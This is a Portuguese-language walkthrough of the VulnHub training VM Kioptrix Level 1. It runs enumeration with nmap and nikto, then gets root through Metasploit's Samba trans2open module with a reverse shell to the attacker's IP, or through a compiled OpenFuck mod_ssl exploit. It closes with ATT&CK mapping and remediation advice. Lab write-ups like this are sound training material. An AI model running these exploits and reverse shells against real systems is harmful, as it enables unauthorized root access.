# Kioptrix: Level 1 — O Clássico Que Começou Tudo

Mano, Kioptrix Level 1 é O clássico. Lançada em 2010, essa foi uma das primeiras VMs do VulnHub e se tornou o ponto de partida definitivo para toda uma geração de profissionais de segurança. Rodando Apache 1.3.20, mod_ssl 2.8.4 e Samba 2.2.1a em um kernel Linux 2.4 de 2002, é um museu de vulnerabilidades, mas as técnicas que ela ensina (buffer overflow remoto via CVE conhecido, direto para root) são fundamentais. Sem enrolação, sem rodeios: explorar o Samba, conseguir root. Máquina lendária, véi. fr fr.

Essa máquina ensinou milhares de pessoas que enumeração de versão é tudo. Se você sabe qual versão algo está rodando, pode pesquisar se é explorável. Essa é a lição inteira. Grande respeito aos criadores do Kioptrix por democratizar a educação em segurança.

---

| Campo | Valor |
|---|---|
| **Nível** | Fácil / Iniciante |
| **VM Alvo** | Kioptrix: Level 1 (#1) |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ |
| **Técnicas** | Enumeração de serviços e versões com Nmap, varredura de vulnerabilidades web com Nikto, exploit Metasploit Samba trans2open (CVE-2003-0201), shell root direto (sem etapa de escalonamento de privilégios) |
| **CVEs** | CVE-2003-0201 (Samba trans2open: buffer overflow remoto no Samba 2.2.x, explorável diretamente para root); CVE-2002-0082 (mod_ssl OpenFuck: buffer overflow no OpenSSL <= 0.9.6d, caminho alternativo para root) |
| **Grupos APT** | Embora esses CVEs sejam anteriores à taxonomia APT moderna, o padrão de exploração (explorar serviço de rede sem patch para root remoto) permanece o padrão definidor de acesso inicial para grupos como APT28, APT41 e campanhas da era EternalBlue |

---

## Resumo do Ataque

```
netdiscover → alvo: 192.168.1.109
    |
    v
nmap -A → Apache 1.3.20 (80), mod_ssl 2.8.4, Samba 2.2.1a (139/445)
    |
    v
nikto → confirma Apache/mod_ssl desatualizados, potencial CVE-2002-0082
    |
    v
CAMINHO A: Metasploit trans2open (CVE-2003-0201)
    |    use exploit/linux/samba/trans2open
    |    set RHOST + LHOST + linux/x86/shell_reverse_tcp
    |    exploit
    |
    v
uid=0(root) — root direto via overflow Samba
    |
    v
OU:
    |
CAMINHO B: OpenFuck (CVE-2002-0082)
    compilar + executar com offset 0x6b ou 0x6c → shell root
```

---

## Metodologia

1. Descoberta de rede com netdiscover
2. Varredura completa de portas e versões com nmap
3. Varredura de vulnerabilidades web com nikto (identifica Apache/SSL desatualizados)
4. Identificar Samba 2.2.x como alvo principal de exploit
5. Explorar CVE-2003-0201 via Metasploit trans2open
6. Receber shell root direto (sem etapa de escalonamento de privilégios)

---

## Passo 1 — Descoberta do Host

```bash
sudo netdiscover -r 192.168.1.0/24
# ou:
sudo arp-scan -l
```

Alvo identificado em `192.168.1.109` (ajuste para sua rede).

**MITRE ATT&CK:** T1018 — Descoberta de Sistema Remoto

---

## Passo 2 — Enumeração de Portas e Serviços

```bash
nmap -A -p- 192.168.1.109
```

Resultados principais:

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2
80/tcp   open  http        Apache httpd 1.3.20 (mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn Samba 2.2.1a
443/tcp  open  ssl/https   Apache 1.3.20
```

Cada versão aqui é antiga e vulnerável. Apache 1.3.20, mod_ssl 2.8.4, Samba 2.2.1a, OpenSSH 2.9p2. Essa máquina está rodando software com mais de 20 anos, o que é historicamente preciso para a era em que o Kioptrix 1 foi criado.

**Descoberta crítica:** Samba 2.2.x é vulnerável ao CVE-2003-0201 (trans2open), um buffer overflow remoto que dá acesso root imediato sem autenticação. Caramba!

**Descoberta secundária:** Apache 1.3.20 com mod_ssl 2.8.4 e OpenSSL 0.9.6b é vulnerável ao CVE-2002-0082 (OpenFuck). O exploit requer compilação e correspondência de offset de versão, mas também entrega root.

**Nota do mundo real:** Detecção de versão de software é a base de qualquer avaliação de vulnerabilidade. Quando você vê um Samba de 22 anos rodando em um sistema de produção, a conversa não é "é vulnerável?" mas "quais dos 15 CVEs devo priorizar?"

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede; T1082 — Descoberta de Informações do Sistema

---

## Passo 3 — Varredura de Vulnerabilidades Web

```bash
nikto -h http://192.168.1.109
```

Nikto confirma:
- Apache 1.3.20 com vulnerabilidades conhecidas
- mod_ssl 2.8.4 (candidato ao CVE-2002-0082)
- Arquivos padrão, listagens de diretório

Nikto é útil como verificação rápida, mas não detecta a vulnerabilidade do Samba. Para isso, a detecção de versão do nmap é o sinal.

**MITRE ATT&CK:** T1595.002 — Varredura Ativa: Varredura de Vulnerabilidade

---

## Passo 4 — Exploração: Samba trans2open (CVE-2003-0201)

O Samba 2.2.x tem um buffer overflow remoto na função `trans2open` (CVE-2003-0201). O Metasploit fornece um módulo confiável para isso.

```bash
msfconsole
```

```
use exploit/linux/samba/trans2open
set RHOST 192.168.1.109
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 192.168.1.2   # seu IP de atacante
set LPORT 4444
exploit
```

Se o payload meterpreter falhar, mude para shell raw:

```
set PAYLOAD linux/x86/shell_reverse_tcp
exploit
```

**Resultado esperado:** shell com `uid=0(root)`. Sem escalonamento de privilégios necessário. O buffer overflow roda no contexto do daemon Samba, que roda como root nessa configuração.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

Sensacional, véi! Root direto, sem nenhuma etapa adicional.

**MITRE ATT&CK:** T1210 — Exploração de Serviços Remotos; T1059.004 — Interpretador de Comando: Unix Shell

---

## Passo 5 — Caminho Alternativo: OpenFuck (CVE-2002-0082)

Se quiser praticar o caminho de exploração manual, o CVE-2002-0082 (buffer overflow mod_ssl/OpenSSL) está disponível.

```bash
# Baixar o exploit
searchsploit "apache mod_ssl" | grep -i "764"
# ou encontre em EDB-764

# O exploit requer headers OpenSSL 0.9.6 para compilar
apt-get install libssl-dev

# Compilar
gcc -o OpenFuck 764.c -lcrypto

# Identificar o offset correto (0x6b = RedHat 7.2 Apache 1.3.20)
./OpenFuck | grep -i "redhat"
./OpenFuck 0x6b 192.168.1.109 -c 40
```

O caminho manual ensina como usar código de exploit legado, que é uma habilidade real ao lidar com sistemas mais antigos ou CVEs sem módulos Metasploit.

**MITRE ATT&CK:** T1210 — Exploração de Serviços Remotos

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Notas |
|---|---|---|---|
| Shell root | uid=0(root) | Via Samba CVE-2003-0201 ou mod_ssl CVE-2002-0082 | Root direto, sem privesc necessário |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Principal Lição |
|---|---|---|---|
| 1 | Samba 2.2.x (CVE-2003-0201) sem patch | Serviços de rede sem patch com RCEs públicos são o vetor de acesso inicial mais comum | Enumeração de versão é tudo: se você sabe a versão, sabe os exploits |
| 2 | Apache 1.3.20 + mod_ssl 2.8.4 (CVE-2002-0082) | Pilhas web EOL em produção expõem sistemas inteiros a exploits públicos | Substituir software EOL imediatamente; EOL = sem patches de segurança |
| 3 | Buffer overflow para root direto | Alguns daemons rodam como root; explorá-los pula o escalonamento de privilégios | Serviços de rede devem rodar como usuários sem privilégios |
| 4 | Múltiplos CVEs simultâneos | Uma máquina rodando software de 2002 tem dezenas de CVEs sem patch, todos publicamente conhecidos | Manter um programa de gerenciamento de vulnerabilidades; patch ou controles compensatórios são necessários |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Reconhecimento | Varredura Ativa: Varredura de Vulnerabilidade | T1595.002 |
| Reconhecimento | Descoberta | Descoberta de Sistema Remoto | T1018 |
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Acesso Inicial | Acesso Inicial | Exploração de Serviços Remotos (Samba CVE-2003-0201) | T1210 |
| Execução | Execução | Interpretador de Comando: Unix Shell | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Atualizar Samba imediatamente**: Samba 2.2.x atingiu EOL em 2004; atualizar para a versão estável atual ou desabilitar SMB se não necessário
2. **Substituir Apache 1.3.20**: Apache 1.x atingiu EOL em 2010; substituir por Apache 2.4.x ou nginx com patches de segurança atuais
3. **Substituir OpenSSL 0.9.6b**: Atualizar para uma versão OpenSSL suportada atualmente
4. **Atualizar OpenSSH 2.9p2**: Múltiplas vulnerabilidades conhecidas; atualizar para a versão atual
5. **Executar serviços como não-root**: Usar sandboxing de serviço systemd (`User=samba`, `NoNewPrivileges=yes`)
6. **Firewall SMB**: Se o Samba for necessário apenas para uso interno, bloquear portas 139/445 no perímetro de rede

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços de rede com informações de versão |
| Proteger | Tecnologia Protetora | Aplicar patch ou substituir todo software EOL |
| Proteger | Controle de Acesso | Executar serviços como usuários sem privilégios; firewall portas de serviço não utilizadas |
| Detectar | Monitoramento Contínuo | Varrer versões de serviço vulneráveis com scanner de vulnerabilidade autenticado |
| Responder | Planejamento de Resposta | Isolar host comprometido; auditar todas as contas para persistência |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-2 | Remediação de Falhas | Aplicar patch em software EOL dentro do SLA definido; sem software sem suporte em produção |
| CM-7 | Funcionalidade Mínima | Desabilitar SMB se não necessário; remover serviços de rede não utilizados |
| AC-6 | Privilégio Mínimo | Executar serviços de rede como usuários não-root |
| RA-5 | Monitoramento e Varredura de Vulnerabilidade | Varrer todos os hosts de produção para CVEs conhecidos com varredura autenticada |

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de TI | MIL2 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL3 |
| Cadeia de Suprimentos e Dependências (SCRM) | Gerenciar Risco da Cadeia de Suprimentos de TIC | MIL2 |

### MITRE D3FEND

- **D3-SU** — Atualização de Software (aplicar patch no Samba, Apache, OpenSSL para versões suportadas atuais)
- **D3-NTF** — Filtragem de Tráfego de Rede (bloquear SMB portas 139/445 no perímetro)
- **D3-OAM** — Gerenciamento Administrativo do SO (executar serviços como não-root)

---

## Considerações Finais

Kioptrix Level 1 não é uma máquina sofisticada. É uma máquina honesta. A lição é simples, atemporal e ainda relevante em 2024: se você roda software com exploits RCE públicos e sem patches, atacantes vão conseguir root. Sem engenharia social, sem zero-days, sem cadeias complexas. Apenas `nmap`, `msfconsole` e `exploit`.

A série Kioptrix (Levels 1 ao 5) ainda é um dos melhores caminhos de aprendizado progressivo no VulnHub. Comece aqui, avance por todos os cinco, e você terá coberto uma base sólida de técnicas clássicas de exploração.

Mano, essa máquina literalmente ensinou uma geração a fazer pentest. Respeito enorme. gg

Thanks guys!! (❍ᴥ❍ʋ)
